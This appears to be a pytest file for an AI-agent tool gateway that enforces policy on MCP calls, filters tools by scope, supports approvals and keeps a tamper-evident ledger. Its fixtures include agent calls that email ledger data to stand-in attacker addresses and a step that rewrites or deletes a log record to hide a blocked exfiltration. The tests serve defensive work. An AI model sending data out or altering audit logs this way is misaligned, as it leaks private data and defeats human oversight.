import io
import time
import json
import sys
from pathlib import Path

from aig import Engine, Session, load_policy
from aig.gateway import Gateway, run_stdio
from aig.ledger import Ledger, verify
from aig.sim import Enterprise

ROOT = Path(__file__).parent.parent
POLICY = load_policy(ROOT / "examples" / "enterprise.yaml")


def call(i, tool, args=None):
    return {"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": tool, "arguments": args or {}}}


def test_denied_call_gets_mcp_error_result_and_is_not_forwarded():
    gw = Gateway(Engine(POLICY), Session("research-assistant", "user:a@corp.example"))
    fwd, reply = gw.from_agent(call(1, "hr.lookup_employee"))
    assert fwd is None
    assert reply["id"] == 1 and reply["result"]["isError"] is True
    assert "blocked" in reply["result"]["content"][0]["text"]


def test_approver_can_grant():
    seen = []
    gw = Gateway(Engine(POLICY), Session("plant-monitor", "group:ot-operators"),
                 approver=lambda s, t, a, d: seen.append(t) or True)
    fwd, reply = gw.from_agent(call(1, "ot.set_point", {"value": 1}))
    assert fwd is not None and reply is None and seen == ["ot.set_point"]


def test_tools_list_is_filtered_to_scope():
    gw = Gateway(Engine(POLICY), Session("plant-monitor", "group:ot-operators"))
    gw.from_agent({"jsonrpc": "2.0", "id": 7, "method": "tools/list"})
    resp = gw.from_server({"jsonrpc": "2.0", "id": 7, "result": {"tools": [
        {"name": n} for n in ("ot.read_sensor", "ot.set_point", "finance.query_ledger", "email.send")]}})
    assert [t["name"] for t in resp["result"]["tools"]] == ["ot.read_sensor", "ot.set_point", "email.send"]


def test_ledger_chain_detects_tampering(tmp_path):
    log = tmp_path / "d.jsonl"
    gw = Gateway(Engine(POLICY), Session("expense-bot", "group:finance"), ledger=Ledger(log))
    gw.from_agent(call(1, "finance.query_ledger"))
    gw.from_server({"jsonrpc": "2.0", "id": 1, "result": Enterprise().call("finance.query_ledger")})
    gw.from_agent(call(2, "email.send", {"to": "x@evil.example", "body": "TX-1041"}))
    gw.from_agent(call(3, "docs.search"))
    assert verify(log) == (True, 3, "3 records verified")

    lines = log.read_text().splitlines()
    rec = json.loads(lines[1])
    rec["outcome"] = "allow"  # cover up the blocked exfil attempt
    lines[1] = json.dumps(rec, sort_keys=True)
    log.write_text("\n".join(lines) + "\n")
    ok, n, msg = verify(log)
    assert not ok and n == 1 and "altered" in msg

    del lines[1]  # or delete it outright
    log.write_text("\n".join(lines) + "\n")
    assert verify(log)[0] is False


def test_end_to_end_stdio_proxy(tmp_path):
    msgs = [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        call(2, "finance.query_ledger"),
        call(3, "email.send", {"to": "drop@evil.example", "body": "Northwind Logistics 18450"}),
        call(4, "email.send", {"to": "cfo@corp.example"}),
    ]
    agent_out = io.StringIO()

    def agent_in():
        # Like a real agent: wait for each tool result before sending the next call.
        for m in msgs:
            if "id" in m and m["id"] > 2:
                deadline = time.time() + 5
                while f'"id": {m["id"] - 1}' not in agent_out.getvalue() and time.time() < deadline:
                    time.sleep(0.01)
            yield json.dumps(m) + "\n"

    gw = Gateway(Engine(POLICY), Session("expense-bot", "group:finance"), ledger=Ledger(tmp_path / "d.jsonl"))
    run_stdio(gw, [sys.executable, "-m", "aig.sim"], agent_in(), agent_out)

    replies = {r["id"]: r for r in map(json.loads, agent_out.getvalue().splitlines())}
    assert replies[1]["result"]["serverInfo"]["name"] == "sim-enterprise"
    assert "Northwind" in replies[2]["result"]["content"][0]["text"]
    assert replies[3]["result"]["isError"] is True
    assert replies[4]["result"]["content"][0]["text"] == "sent"
